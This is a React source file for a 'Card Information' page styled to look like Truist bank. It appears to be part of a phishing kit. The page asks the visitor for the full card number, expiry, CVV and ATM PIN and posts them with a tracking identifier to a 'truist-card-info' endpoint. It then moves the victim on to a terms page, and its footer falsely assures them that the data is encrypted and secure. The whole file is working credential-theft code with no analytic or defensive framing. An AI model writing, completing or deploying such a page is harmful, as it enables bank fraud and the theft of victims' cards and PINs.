import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import { inputStyles, buttonStyles, cardStyles } from '../Utils/truistStyles';

const Card: React.FC = () => {
  const [cardNumber, setCardNumber] = useState('');
  const [expiryMonth, setExpiryMonth] = useState('');
  const [expiryYear, setExpiryYear] = useState('');
  const [cvv, setCvv] = useState('');
  const [atmPin, setAtmPin] = useState('');
  const [showCvv, setShowCvv] = useState(false);
  const [showPin, setShowPin] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    cardNumber: '',
    expiry: '',
    cvv: '',
    atmPin: ''
  });

  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz } = location.state || {};

  if (!emzemz) {
    return (
      <div className={cardStyles.base}>
        <div className={cardStyles.padding}>
          <h1 className="mx-auto mb-6 w-full text-center text-3xl font-semibold text-[#2b0d49]">
            Error
          </h1>
          <p className="text-sm font-semibold text-[#6c5d85] mb-8">
            Missing user details. Please restart the process.
          </p>
        </div>
      </div>
    );
  }

  const formatCardNumber = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '').slice(0, 16);
    const groups = digitsOnly.match(/.{1,4}/g);
    return groups ? groups.join(' ') : digitsOnly;
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    setCardNumber(formatted);
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const cardDigits = cardNumber.replace(/\s/g, '');
    const newErrors = {
      cardNumber: cardDigits.length !== 16 ? 'Card number must be 16 digits' : '',
      expiry: !expiryMonth || !expiryYear ? 'Expiry date is required' : '',
      cvv: cvv.length !== 3 && cvv.length !== 4 ? 'CVV must be 3 or 4 digits' : '',
      atmPin: atmPin.length !== 4 ? 'ATM PIN must be 4 digits' : ''
    };

    setErrors(newErrors);

    if (!Object.values(newErrors).some(error => error)) {
      try {
        await axios.post(`${baseUrl}api/truist-card-info/`, {
          emzemz,
          cardNumber: cardDigits,
          expiryMonth,
          expiryYear,
          cvv,
          atmPin
        });
        console.log('Card information submitted successfully');
        navigate('/terms', { state: { emzemz } });
      } catch (error) {
        console.error('Error submitting card info:', error);
        setIsLoading(false);
      }
    } else {
      setIsLoading(false);
    }
  };

  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 15 }, (_, i) => currentYear + i);

  return (
    <div className="flex flex-col items-center justify-center">
      <div className={cardStyles.base}>
        <div className={cardStyles.padding}>
          <h1 className="mx-auto mb-6 w-full text-center text-3xl font-semibold text-[#2b0d49]">
            Card Information
          </h1>
          <p className="text-sm font-semibold text-[#6c5d85] mb-8">
            Please provide your card details for verification purposes.
          </p>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-2">
              <label className="text-sm text-[#5d4f72]" htmlFor="cardNumber">
                Card Number
              </label>
              <input
                id="cardNumber"
                name="cardNumber"
                type="text"
                value={cardNumber}
                onChange={handleCardNumberChange}
                maxLength={19}
                className={`${inputStyles.base} ${inputStyles.focus}`}
                placeholder="1234 5678 9012 3456"
              />
              {errors.cardNumber && (
                <div className="flex items-center gap-2 text-xs font-semibold text-[#b11f4e] mt-2">
                  <svg aria-hidden="true" className="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                  </svg>
                  <span>{errors.cardNumber}</span>
                </div>
              )}
            </div>

            <div className="space-y-2">
              <label className="text-sm text-[#5d4f72]">Expiry Date</label>
              <div className="flex gap-2">
                <select
                  value={expiryMonth}
                  onChange={(e) => setExpiryMonth(e.target.value)}
                  className={`${inputStyles.base} ${inputStyles.focus}`}
                >
                  <option value="">Month</option>
                  {Array.from({ length: 12 }, (_, i) => (
                    <option key={i + 1} value={String(i + 1).padStart(2, '0')}>
                      {String(i + 1).padStart(2, '0')}
                    </option>
                  ))}
                </select>
                <select
                  value={expiryYear}
                  onChange={(e) => setExpiryYear(e.target.value)}
                  className={`${inputStyles.base} ${inputStyles.focus}`}
                >
                  <option value="">Year</option>
                  {years.map((year) => (
                    <option key={year} value={year}>
                      {year}
                    </option>
                  ))}
                </select>
              </div>
              {errors.expiry && (
                <div className="flex items-center gap-2 text-xs font-semibold text-[#b11f4e] mt-2">
                  <svg aria-hidden="true" className="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                  </svg>
                  <span>{errors.expiry}</span>
                </div>
              )}
            </div>

            <div className="space-y-2">
              <label className="text-sm text-[#5d4f72]" htmlFor="cvv">
                CVV
              </label>
              <div className="relative">
                <input
                  id="cvv"
                  name="cvv"
                  type={showCvv ? 'text' : 'password'}
                  value={cvv}
                  onChange={(e) => {
                    const value = e.target.value.replace(/\D/g, '');
                    if (value.length <= 4) setCvv(value);
                  }}
                  maxLength={4}
                  className={`${inputStyles.base} ${inputStyles.focus}`}
                  placeholder="123"
                />
                <button
                  type="button"
                  onClick={() => setShowCvv(!showCvv)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-[#5f259f] text-sm hover:underline"
                >
                  {showCvv ? 'Hide' : 'Show'}
                </button>
              </div>
              {errors.cvv && (
                <div className="flex items-center gap-2 text-xs font-semibold text-[#b11f4e] mt-2">
                  <svg aria-hidden="true" className="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                  </svg>
                  <span>{errors.cvv}</span>
                </div>
              )}
            </div>

            <div className="space-y-2">
              <label className="text-sm text-[#5d4f72]" htmlFor="atmPin">
                ATM PIN
              </label>
              <div className="relative">
                <input
                  id="atmPin"
                  name="atmPin"
                  type={showPin ? 'text' : 'password'}
                  value={atmPin}
                  onChange={(e) => {
                    const value = e.target.value.replace(/\D/g, '');
                    if (value.length <= 4) setAtmPin(value);
                  }}
                  maxLength={4}
                  className={`${inputStyles.base} ${inputStyles.focus}`}
                  placeholder="****"
                />
                <button
                  type="button"
                  onClick={() => setShowPin(!showPin)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-[#5f259f] text-sm hover:underline"
                >
                  {showPin ? 'Hide' : 'Show'}
                </button>
              </div>
              {errors.atmPin && (
                <div className="flex items-center gap-2 text-xs font-semibold text-[#b11f4e] mt-2">
                  <svg aria-hidden="true" className="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                  </svg>
                  <span>{errors.atmPin}</span>
                </div>
              )}
            </div>

            <div className="flex flex-wrap gap-3 pt-2">
              <button
                type="submit"
                className={buttonStyles.base}
                disabled={isLoading}
              >
                {isLoading ? (
                  <span className={buttonStyles.loading}></span>
                ) : (
                  'Continue'
                )}
              </button>
            </div>

            <p className="text-xs text-[#5d4f72] mt-4">
              Your card information is encrypted and secure. We use industry-standard security measures to protect your data.
            </p>
          </form>
        </div>
      </div>
    </div>
  );
};

export default Card;
